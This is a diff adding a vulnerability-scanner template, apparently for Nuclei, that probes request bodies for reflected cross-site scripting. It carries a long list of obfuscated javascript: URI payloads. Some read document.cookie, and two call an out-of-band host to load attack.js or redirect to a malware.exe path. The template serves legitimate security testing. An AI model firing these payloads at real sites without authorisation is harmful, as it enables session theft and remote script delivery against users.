@@ -1,0 +1,137 @@
+id: javascript-xss-body
+
+info:
+  name: Reflected Cross Site Scripting
+  author: reewardius
+  severity: high
+  tags: fuzzing-req,fuzzing-req-xss,fuzzing-req-body,fuzzing-req-body-query,xss,dast
+  
+variables:
+  first: "{{rand_int(10000, 99999)}}"
+  
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "POST"'
+          - 'method == "PUT"'
+          - 'method == "DELETE"'
+          - 'method == "PATCH"'
+        
+    payloads:
+      xss:
+        - "javascript:alert('{{randstr}}');//"
+        - "javascript:alert('{{randstr}}')//https://{{Host}}/"
+        - "javascript:top/**/?.['window']['eval'](atob?.('YWxlcnQoKQ=='))"
+        - "javascript://javascript:alert(1)%0A%0Dalert('{{randstr}}');"
+        - "javascript://javascript:alert(1)%0D%0Aalert('{{randstr}}');"
+        - "javascript://{{Host}}/%0Aalert('{{randstr}}')"
+        - "%27);});});javascript:alert('{{randstr}}');//g"
+        - "%27);});javascript:alert('{{randstr}}');//g"
+        - "%27);javascript:alert('{{randstr}}');//g"
+        - "%27));javascript:alert('{{randstr}}');//g"
+        - "[a](javascript:alert('{{randstr}}'))"
+        - "%00javascript:alert('{{randstr}}')"
+        - "%09jav%09ascript:alert('{{randstr}}')"
+        - "%09javascript:alert('{{randstr}}')"
+        - "amF2YXNjcmlwdDphbGVydCgiWHNzIGJ5IHZpa2FzIik%3D"
+        - "%0Bjavascript:alert('{{randstr}}')"
+        - "%0Cjavascript:alert('{{randstr}}')"
+        - "%0djavascript:alert('{{randstr}}')//%0aaaaaa"
+        - "%20javascript:alert('{{randstr}}')"
+        - "%26%2302java%26%23115cript:alert('{{randstr}}')"
+        - "%22%3E%3Cscript%3Ejavascript%3Aalert%28'{{randstr}}'%29%3C%2Fscript%3E"
+        - "%27%22%3E%3Cscript%3Ejavascript%3Aalert%28'{{randstr}}'%29%3C%2Fscript%3E"
+        - "%3Ciframe%20src%3D%22javascript%3Aalert%28'{{randstr}}'%29%22%3E"
+        - "/%09/javascript:alert('{{randstr}}')"
+        - "/%5cjavascript:alert('{{randstr}}')"
+        - "//%5cjavascript:alert('{{randstr}}')"
+        - "//j%5c%5cjavascript%3aalert('{{randstr}}')"
+        - "//javascript:alert('{{randstr}}')"
+        - "//javascript:alert('{{randstr}}');"
+        - "/javascript:alert('{{randstr}}')"
+        - "/x:1/:///%01javascript:alert('{{randstr}}')/"
+        - "</p>iframe src=javascript:alert('{{randstr}}')//"
+        - "<>javascript:alert('{{randstr}}');"
+        - "data:text/javascript,alert('{{randstr}}');"
+        - "Javas%26%2399;ript:alert('{{randstr}}')"
+        - "javascript:top[/al/.source+/ert/.source](document.cookie)"
+        - "\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert('{{randstr}}')"
+        - "\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert('{{randstr}}')"
+        - "jaVAscript://{{Host}}//%0d%0aalert('{{randstr}}');//"
+        - "ja\nva\tscript\r:alert('{{randstr}}')"
+        - "java%09script:alert('{{randstr}}')"
+        - "java%0ascript:alert('{{randstr}}')"
+        - "java%0d%0ascript%0d%0a:alert('{{randstr}}')"
+        - "java%0dscript:alert('{{randstr}}')"
+        - "java%26%09%3bscript:ale%26%09%3brt('{{randstr}}')"
+        - "javascripT://anything%0D%0A%0D%0Aalert('{{randstr}}')"
+        - "javascript%3aalert('{{randstr}}')%2f%2f"
+        - "javascript&#58;alert('{{randstr}}')"
+        - "javascript&#x0003A;alert('{{randstr}}')"
+        - "javascript&colon;alert('{{randstr}}')"
+        - "javascript:%250Aalert('{{randstr}}')"
+        - "javascript:(alert(%27{{randstr}}%27))()"
+        - "javascript://%0aalert('{{randstr}}')"
+        - "javascript://%250aalert('{{randstr}}')"
+        - "javascript://https://{{Host}}/?z=%0Aalert('{{randstr}}')"
+        - "javascript://xyz%E2%80%A8alert('{{randstr}}')"
+        - "javascript://{{Host}}?%a0alert%28'{{randstr}}'%29"
+        - "javascript:alert%09('{{randstr}}')"
+        - "javascript:alert('{{randstr}}')"
+        - "javascript:alert('{{randstr}}');//://{{Host}}/"
+        - "javascript:alert(document/**/.domain)%3b"
+        - "javascript:$.getScript`https://{{interactsh-url}}/attack.js`"
+        - "javascript:window.location.href='https://{{interactsh-url}}/app/conf/malware.exe'"
+        - "javascript:void(0)"
+        
+    fuzzing:
+      - part: body
+        mode: single
+        type: replace
+        fuzz:
+          - "{{xss}}"
+          
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<a href="javascript:alert'
+          - '<a href=javascript:alert'
+          - '=javascript:alert'
+          - "<a href=data:text/javascript,alert('{{randstr}}');"
+          - '<form action="javascript:alert'
+          - '<form action="javascript:'
+          - '<form action="data:text/javascript,alert("{{randstr}}");'
+          - '<form action=data:text/javascript,alert("{{randstr}}");'
+          - '<form action="javascript:void(0)'
+          - '<form action=javascript:void(0)'
+          - '<a href=javascript:void(0)'
+          - '<a href="javascript:void(0)'
+          - 'javascript:window.location.href'
+        condition: or
+
+      - type: word
+        part: body
+        words:
+          - '{{randstr}}'
+          - '<form action="javascript:alert'
+        condition: and
+        
+      - type: word
+        part: body
+        words:
+          - <form action="javascript:alert('{{randstr}}')
+          - <form action="javascript:top[/al/.source+/ert/.source](document.cookie)
+          - <a href="javascript:alert('{{randstr}}')
+          - <a href="javascript:top[/al/.source+/ert/.source](document.cookie)
+        condition: or
+
+      - type: word
+        part: interactsh_protocol 
+        words:
+          - "http"
+          - "dns"
+        condition: or
